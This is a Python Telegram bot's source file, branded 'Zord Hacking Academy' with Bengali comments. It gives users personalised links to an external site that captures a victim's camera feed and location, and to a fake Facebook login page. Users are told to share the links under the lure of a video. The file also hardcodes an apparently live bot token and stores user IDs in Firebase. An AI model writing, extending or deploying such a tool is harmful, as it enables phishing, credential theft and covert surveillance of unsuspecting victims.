import telebot
from telebot import types
import time
from flask import Flask
from threading import Thread
import os
import requests

# আপনার বোট টোকেন এবং অ্যাডমিন আইডি
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
bot = telebot.TeleBot(BOT_TOKEN)

# আপনার ফায়ারবেস লিঙ্ক
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/.json"

# --- ডাটাবেজ ফাংশন ---
def save_user(user_id):
    """ইউজার আইডি ফায়ারবেসে সেভ করবে"""
    try:
        requests.patch(FIREBASE_URL, json={str(user_id): "active"})
    except:
        pass

def load_users():
    """ফায়ারবেস থেকে সব আইডি নিয়ে আসবে"""
    try:
        response = requests.get(FIREBASE_URL)
        data = response.json()
        return data.keys() if data else []
    except:
        return []

# --- ফ্লাস্ক সার্ভার (Render এর জন্য) ---
app = Flask('')

@app.route('/')
def home():
    return "Zord Hacking Academy Bot is Active!"

def run():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- বোট লজিক ---
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    save_user(user_id) # ইউজার সেভ হচ্ছে
    
    welcome_text = (
        f"👋 **Welcome to Hacking Academy with Zord**\n\n"
        "এর সাহায্যে আপনি যে কারো ক্যামেরা, লোকেশন এবং ফেসবুক আইডি পাস সংগ্রহ করতে পারবেন।\n\n"
        "নিচের মেনু থেকে অপশনটি বেছে নিন।"
    )
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📸 Camera & Location", callback_data='cam_link')
    btn2 = types.InlineKeyboardButton("🔐 Facebook Pass", callback_data='fb_link')
    
    # শুধু অ্যাডমিন এই বাটনটি দেখতে পাবে
    if user_id == ADMIN_ID:
        btn_admin = types.InlineKeyboardButton("📢 Send Update to All", callback_data='admin_update')
        markup.add(btn1, btn2, btn_admin)
    else:
        markup.add(btn1, btn2)
        
    bot.send_message(user_id, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    user_id = call.message.chat.id
    
    if call.data == 'cam_link':
        personal_link = f"{BASE_URL}?id={user_id}"
        bot.send_message(user_id, f"✅ **আপনার ক্যামেরা ও লোকেশন লিঙ্ক:**\n`{personal_link}`\n\n⚠️ কেউ খারাপ কাজে ব্যবহার করবেন না।")

    elif call.data == 'fb_link':
        personal_link = f"{BASE_URL}fb/?id={user_id}"
        bot.send_message(user_id, f"🔥 **আপনার ফেসবুক লগইন পেজ লিঙ্ক:**\n`{personal_link}`\n\n⚠️ এটি ভিডিও দেখার টোপ দিয়ে শেয়ার করুন। কেউ খারাপ কাজে ব্যবহার করবেন না।")

    elif call.data == 'admin_update':
        if user_id == ADMIN_ID:
            users = load_users()
            count = 0
            for u_id in users:
                try:
                    bot.send_message(u_id, "📢 **Bot Update Successful!**\nসবকিছু এখন আরও দ্রুত এবং নির্ভুলভাবে কাজ করছে।", parse_mode='Markdown')
                    count += 1
                except: continue
            bot.answer_callback_query(call.id, f"{count} জনকে আপডেট পাঠানো হয়েছে।")

# --- বোট রান করা ---
if __name__ == "__main__":
    keep_alive() 
    print("✅ বোট সফলভাবে চালু হয়েছে!")
    bot.infinity_polling(none_stop=True, timeout=60)
